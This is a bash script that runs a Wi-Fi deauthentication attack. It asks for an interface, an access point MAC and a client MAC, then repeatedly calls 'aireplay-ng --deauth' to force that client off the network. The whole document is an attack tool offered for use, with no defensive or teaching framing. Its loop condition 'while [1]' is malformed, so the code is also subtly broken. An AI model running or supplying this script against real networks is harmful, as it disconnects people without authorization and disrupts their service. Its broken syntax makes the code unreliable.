#!/bin/bash
if [ $UID != 0 ];
then
	echo "must be root to run this"
	exit 1
fi
echo " enter interface :"
read interface
echo " enter MAC address of the AP - format XX:XX:XX:XX:XX:XX :"
read MAC
echo "enter client MAC to deauth - format XX:XX:XX:XX:XX:XX :"
read CLIENT
echo "performing attack - sending deauth"
while [1]
do
    aireplay-ng --deauth 1000 -a $MAC -c $CLIENT $interface
done
